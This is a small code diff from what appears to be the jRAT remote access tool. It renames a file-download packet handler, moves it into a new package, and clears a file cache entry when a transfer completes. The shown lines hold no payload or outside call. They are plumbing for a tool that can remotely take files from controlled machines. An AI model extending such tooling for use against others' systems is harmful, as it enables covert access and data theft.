@@ -1,4 +1,4 @@
-package jrat.module.fs.packets;
+package jrat.module.fs.packets.download;
 
 import jrat.client.Connection;
 import jrat.client.packets.incoming.IncomingPacket;
@@ -6,7 +6,7 @@ import jrat.common.Transfer;
 import jrat.common.io.FileCache;
 import jrat.common.io.TransferData;
 
-public class Packet102ClientDownload implements IncomingPacket {
+public class Packet102DownloadState implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
@@ -15,6 +15,7 @@ public class Packet102ClientDownload implements IncomingPacket {
 
         switch (action) {
             case Transfer.Complete:
+                FileCache.remove(file);
                 break;
             case Transfer.CANCEL:
                 TransferData localData = FileCache.get(file);
